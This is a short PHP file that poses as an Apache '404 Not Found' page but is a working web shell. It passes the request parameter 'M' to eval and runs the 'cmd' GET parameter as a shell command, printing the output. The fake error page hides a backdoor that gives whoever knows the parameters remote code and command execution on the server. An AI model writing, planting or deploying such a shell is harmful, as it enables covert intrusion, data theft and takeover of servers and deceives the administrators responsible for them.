<?php
echo "<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
</body>
</html>
<br/>
<br/>";


if(isset($_GET['cmd'])){
$str=$_GET['cmd'];

}

eval (a());
function a(){
        $a = $_REQUEST["M"];
        return $a;
}


print `$str`;

?>